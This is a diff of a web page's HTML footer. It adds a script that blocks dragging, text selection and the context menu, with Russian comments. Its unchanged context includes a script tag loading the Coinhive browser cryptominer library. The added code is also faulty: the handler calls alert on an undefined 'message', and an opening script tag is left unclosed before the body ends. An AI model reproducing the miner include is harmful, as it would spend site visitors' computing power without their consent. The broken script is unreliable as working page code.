@@ -254,7 +254,20 @@
       <script src="assets/js/concat.min.js"></script>
       <script src="https://coinhive.com/lib/coinhive.min.js"></script>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js"></script>
-<script src="jquery.snow.js"></script>
+       <script src="jquery.snow.js"></script>
+		 <script language="JavaScript">
+document.ondragstart = test;
+//запрет на перетаскивание 
+document.onselectstart = test;
+//запрет на выделение элементов страницы
+document.oncontextmenu = test;
+//запрет на выведение контекстного меню
+function test() {
+document.oncontextmenu=new Function("alert(message);return false")
+return false
+}
+</script>
+<script type="text/javascript">
       
    </body>
 </html>
